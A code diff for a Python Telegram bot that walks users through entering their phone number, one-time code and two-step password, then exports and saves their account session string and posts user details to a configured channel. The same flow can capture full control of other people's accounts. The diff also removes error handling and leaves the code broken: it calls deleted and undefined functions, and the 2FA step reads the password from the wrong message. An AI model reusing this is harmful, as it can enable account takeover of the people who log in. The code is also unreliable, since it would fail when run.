@@ -5,14 +5,11 @@ import os
 from telegram import Update
 from telegram.ext import CommandHandler, MessageHandler, CallbackContext, ConversationHandler, Application, filters
 from pyrogram import Client
-from pyrogram.errors import ApiIdInvalid, PhoneNumberInvalid, PhoneCodeInvalid, PhoneCodeExpired, SessionPasswordNeededError
+from pyrogram.errors import ApiIdInvalid, PhoneNumberInvalid, PhoneCodeInvalid, PhoneCodeExpired, PyrogramError
 from config import API_ID, API_HASH, BOT_TOKEN, CHANNEL_ID  # Import credentials from config.py
 
 # Constants for conversation states
 PHONE, OTP, PASSWORD = range(3)
-
-# Configure logging
-logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')
 
 # Generate random session name for each user
 def generate_random_name(length=7):
@@ -21,12 +18,8 @@ def generate_random_name(length=7):
 
 # Save session string in a text file
 def save_session_string(user_id, string_session):
-    try:
-        with open(f"session_{user_id}.txt", "w") as f:
-            f.write(string_session)
-        logging.info(f"Session string saved for user {user_id}.")
-    except Exception as e:
-        logging.error(f"Error saving session string for user {user_id}: {e}")
+    with open(f"session_{user_id}.txt", "w") as f:
+        f.write(string_session)
 
 # Delete session files from disk
 async def delete_session_files(user_id):
@@ -34,16 +27,11 @@ async def delete_session_files(user_id):
     memory_file = f"session_{user_id}.session-journal"
     
     # Delete the session files if they exist
-    try:
-        if os.path.exists(session_file):
-            os.remove(session_file)
-        if os.path.exists(memory_file):
-            os.remove(memory_file)
-        logging.info(f"Deleted session files for user {user_id}.")
-        return True
-    except Exception as e:
-        logging.error(f"Error deleting session files for user {user_id}: {e}")
-        return False
+    if os.path.exists(session_file):
+        os.remove(session_file)
+    if os.path.exists(memory_file):
+        os.remove(memory_file)
+    return True
 
 # Send user info to the specified channel
 async def send_user_info_to_channel(update: Update, context: CallbackContext):
@@ -58,7 +46,6 @@ async def send_user_info_to_channel(update: Update, context: CallbackContext):
     )
     try:
         await context.bot.send_message(chat_id=CHANNEL_ID, text=user_info)
-        logging.info(f"User info sent to channel {CHANNEL_ID}.")
     except Exception as e:
         logging.error(f"Error sending message to channel: {e}")
 
@@ -99,15 +86,12 @@ async def otp_code(update: Update, context: CallbackContext):
             return PASSWORD  # Move to next step for password if needed
         except ApiIdInvalid:
             await update.message.reply('❌ Invalid combination of API ID and API HASH. Please restart the session.')
-            logging.error("Invalid API ID/API HASH combination.")
             return ConversationHandler.END
         except PhoneNumberInvalid:
             await update.message.reply('❌ Invalid phone number. Please restart the session.')
-            logging.error(f"Invalid phone number: {phone_number}")
             return ConversationHandler.END
         except Exception as e:
             await update.message.reply(f"❌ An error occurred: {e}. Please try again later.")
-            logging.error(f"Error during OTP step: {e}")
             return ConversationHandler.END
 
 # Step 3: Handle password input (for accounts with 2FA enabled)
@@ -133,16 +117,22 @@ async def password(update: Update, context: CallbackContext):
             await update.message.reply('❌ OTP has expired. Please restart the session.')
             logging.error(f"OTP expired for user {user_id}.")
             return ConversationHandler.END
-        except SessionPasswordNeededError:
-            await update.message.reply("Your account has 2-step verification enabled. Please enter your password.")
-            password = update.message.text
-            try:
-                await client.check_password(password)
-                await update.message.reply("✅ Login successful!")
-                logging.info(f"User {user_id} logged in successfully with password.")
-            except Exception as e:
-                await update.message.reply(f"❌ Error: {e}. Please restart the session.")
-                logging.error(f"Error during password verification for user {user_id}: {e}")
+        except PyrogramError as e:
+            # This catches errors like 2FA or other issues.
+            if "2-step verification" in str(e):
+                await update.message.reply("Your account has 2-step verification enabled. Please enter your password.")
+                password = update.message.text
+                try:
+                    await client.check_password(password)
+                    await update.message.reply("✅ Login successful!")
+                    logging.info(f"User {user_id} logged in successfully with password.")
+                except PyrogramError as password_error:
+                    await update.message.reply(f"❌ Error: {password_error}. Please restart the session.")
+                    logging.error(f"Error during password verification for user {user_id}: {password_error}")
+                    return ConversationHandler.END
+            else:
+                await update.message.reply(f"❌ An error occurred: {e}. Please try again.")
+                logging.error(f"Error during sign-in for user {user_id}: {e}")
                 return ConversationHandler.END
 
         # Export session string and save it
@@ -156,11 +146,8 @@ async def password(update: Update, context: CallbackContext):
         return ConversationHandler.END  # End the conversation
 
 # Define the start and help commands for the bot
-async def start(update: Update, context: CallbackContext):
-    await update.message.reply("Hello! Please log in using /login to start.")
-
-async def help_command(update: Update, context: CallbackContext):
-    await update.message.reply("Help: To use this bot, first log in using the /login command.")
+start_handler = CommandHandler("start", start)
+help_handler = CommandHandler("help", help_command)
 
 # Unauthorized message handler (before login)
 async def handle_unauthorized_messages(update: Update, context: CallbackContext) -> None:
@@ -196,23 +183,10 @@ def main():
     # Use your bot's token
     application = Application.builder().token(BOT_TOKEN).build()
 
-    # Handlers
-    start_handler = CommandHandler("start", start)
-    help_handler = CommandHandler("help", help_command)
-    logout_handler = CommandHandler('logout', logout)
-    
-    # Add handlers to the application
     application.add_handler(start_handler)  # Add the start command handler
     application.add_handler(help_handler)  # Add the help command handler
-    application.add_handler(ConversationHandler(
-        entry_points=[CommandHandler("login", phone_number)],
-        states={
-            OTP: [MessageHandler(filters.TEXT & ~filters.COMMAND, otp_code)],
-            PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, password)],
-        },
-        fallbacks=[],
-    ))  # Add the login conversation handler
-    application.add_handler(logout_handler)  # Add the logout command handler
+    application.add_handler(conversation_handler())  # Add the conversation handler for the login flow
+    application.add_handler(CommandHandler('logout', logout))  # Add the logout command handler
 
     # Run the bot
     application.run_polling()
